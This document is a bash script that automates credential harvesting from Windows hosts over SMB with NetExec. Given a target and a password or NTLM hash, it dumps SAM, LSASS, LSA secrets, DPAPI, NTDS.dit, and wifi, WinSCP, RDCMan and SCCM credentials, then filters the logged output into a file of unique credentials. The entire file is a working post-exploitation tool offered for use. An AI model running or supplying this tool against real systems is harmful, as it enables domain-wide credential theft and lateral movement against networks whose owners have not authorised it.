#!/usr/bin/env bash

# ───────── Colors ──────────
C=$(printf '\033')
RED="${C}[1;31m"
GREEN="${C}[1;32m"
YELLOW="${C}[1;33m"
BLUE="${C}[1;34m"
NC="${C}[0m"

# ───────── Usage ──────────
usage() {
  echo -e "${YELLOW}Usage:${NC} $0 <target> -u <user> (-p <pass> | -H <hash>) -o <output-dir>"
  echo ""
  echo "  <target>   Single IP or CIDR (positional argument)"
  echo "  -u         Username"
  echo "  -p         Password"
  echo "  -H         NTLM hash"
  echo "  -o         Output directory (will be created if it doesn't exist)"
  echo "  -h         Show this help"
  exit 1
}

# ───────── Parse Arguments ──────────
TARGET="$1"; shift

while getopts "u:p:H:o:h" opt; do
  case "$opt" in
    u) USER="$OPTARG" ;;
    p) PASS="$OPTARG" ;;
    H) HASH="$OPTARG" ;;
    o) OUTDIR="$OPTARG" ;;
    h) usage ;;
    *) usage ;;
  esac
done

# ───────── Validate Arguments ──────────
if [[ -z "$TARGET" || -z "$USER" || -z "$OUTDIR" ]]; then
  usage
fi

# must provide either -p or -H, but not both
if [[ -z "$PASS" && -z "$HASH" ]]; then
  echo -e "${RED}[-] Either -p or -H must be specified${NC}"
  usage
elif [[ -n "$PASS" && -n "$HASH" ]]; then
  echo -e "${RED}[-] Specify only one of -p or -H, not both${NC}"
  usage
fi

CREDFILE="$OUTDIR/atm.log"
mkdir -p "$OUTDIR"
touch "$CREDFILE"

log() {
  echo -e "${BLUE}[+]${NC} $1"
}

run_nxc () {
  log "Running: $*"
  unbuffer $* | tee -a "$CREDFILE"
}

# build auth flags
AUTH_ARGS="-u $USER"
if [[ -n "$PASS" ]]; then
  AUTH_ARGS+=" -p $PASS"
else
  AUTH_ARGS+=" -H $HASH"
fi

# ───────── Modules ──────────
log "Starting credential collection…"

run_nxc nxc smb "$TARGET" $AUTH_ARGS --sam
run_nxc nxc smb "$TARGET" $AUTH_ARGS -M lsassy
run_nxc nxc smb "$TARGET" $AUTH_ARGS --lsa
run_nxc nxc smb "$TARGET" $AUTH_ARGS --dpapi
run_nxc nxc smb "$TARGET" $AUTH_ARGS -M wifi
run_nxc nxc smb "$TARGET" $AUTH_ARGS -M winscp
run_nxc nxc smb "$TARGET" $AUTH_ARGS -M rdcman
run_nxc nxc smb "$TARGET" $AUTH_ARGS --sccm
log "Running: nxc smb $TARGET $AUTH_ARGS --ntds"
script -efqa "$CREDFILE" -c "printf 'Y\n' | nxc smb $TARGET $AUTH_ARGS --ntds"

# ──────── Extraction & Sorting ────────
log "Extracting potential credential lines…"
awk '{for (i=5; i<=NF; i++) printf $i (i<NF ? OFS : ORS)}' $CREDFILE | rg -a '^\x1b\[1;33m' | sed -r 's/\x1b\[[0-9;]*m//g' | sort -u > "atm.creds"

echo -e "${GREEN}[✓] Raw output:        ${OUTDIR}/atm.log"
echo -e "${GREEN}[✓] Unique credentials: ${OUTDIR}/atm.creds"
